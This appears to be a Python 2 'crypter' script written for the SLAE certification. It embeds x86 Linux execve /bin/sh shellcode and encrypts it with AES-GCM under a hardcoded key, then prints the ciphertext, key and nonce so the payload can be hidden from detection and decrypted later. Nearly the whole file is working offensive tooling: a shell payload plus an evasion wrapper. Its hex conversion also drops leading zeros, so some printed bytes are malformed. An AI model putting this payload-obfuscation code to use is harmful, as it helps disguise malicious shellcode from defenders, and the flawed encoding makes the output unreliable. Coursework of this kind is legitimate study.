#!/usr/bin/python
# -*- coding: utf-8 -*-

# Filename: Crypter.py
# Author: David Alvarez Robles (km0xu95)
# Website: https://blog.asturhackers.es

# Purpose: This assembly file has been created for completing the requirements
# of the SecurityTube Linux Assembly Expert (SLAE) certification

# Libraries import
from Crypto.Cipher import AES
import binascii

# Original shellcode to be encrypted
shellcode = '\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'

# Log message
print "\n[+] Crypting original shellcode with AES algorithm"

# AES encryption key definition (16 bytes)
key = b'PoCPoCPoCPoCPoC!'
# AES encryption algorithm initialization (using key and GCM mode)
cipher = AES.new(key, AES.MODE_GCM)
# Nonce storage
nonce = cipher.nonce
# Shellcode encryption and digest
ciphertext, tag = cipher.encrypt_and_digest(shellcode)

# Ciphered text conversion to bytearray
ciphertext = bytearray(ciphertext)
# Ciphered text conversion to hexadecimal
output = ""
for byte in ciphertext:
        output  += "\\x" + hex(byte).split("0x")[1]

# Nonce conversion to bytearray
nonce = bytearray(nonce)
# Nonce conversion to hexadecimal
output2 = ""
for byte in nonce:
        output2  += "\\x" + hex(byte).split("0x")[1]

# Print output (ciphered text), key and nonce for decryption
print "\n[*] Encrypted shellcode: " + output
print "\n[*] AES key for decryption: " + key
print "\n[*] AES nonce for decryption: " + output2
